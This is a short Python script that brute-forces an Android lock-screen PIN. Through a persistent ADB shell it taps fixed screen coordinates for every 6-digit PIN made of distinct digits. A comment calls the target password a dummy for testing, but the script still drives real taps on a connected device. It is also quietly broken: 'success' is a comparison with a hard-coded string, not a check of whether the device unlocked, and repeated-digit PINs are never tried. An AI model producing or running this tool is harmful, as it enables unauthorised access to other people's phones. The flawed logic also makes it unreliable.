import itertools
import subprocess
import time

# Dummy lock password (for testing only)
lock_password = "123456"

digits = "0123456789"
count = 0

# Screen coordinates (x, y) for each digit based on your interface layout
digit_coords = {
    '1': (186, 1800),
    '2': (524, 1815),
    '3': (878, 1807),
    '4': (192, 1942),
    '5': (520, 1935),
    '6': (872, 1960),
    '7': (199, 2078),
    '8': (534, 2097),
    '9': (890, 2087),
    '0': (543, 2215),
}

print("Starting persistent ADB shell session...")
# Open a single persistent shell process to avoid process-creation lag
adb_process = subprocess.Popen(
    ["adb", "shell"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True
)

try:
    for seq in itertools.permutations(digits, 6):  # unique digits only
        attempt = "".join(seq)
        print(f"Trying: {attempt}")
        count += 1

        # Build a chained command string for all 6 digits of the current attempt
        command_list = []
        for digit in attempt:
            if digit in digit_coords:
                x, y = digit_coords[digit]
                command_list.append(f"input tap {x} {y}")

        # Send all taps in one batch separated by semicolons
        full_command = " ; ".join(command_list) + "\n"
        adb_process.stdin.write(full_command)
        adb_process.stdin.flush()

        # Check if attempt matches the dummy lock
        if attempt == lock_password:
            print(f"✅ Password found: {attempt}")
            break

        # Pause every 5 attempts
        if count % 5 == 0:
            time.sleep(100000)

finally:
    # Safely close the background shell when done or interrupted
    adb_process.terminate()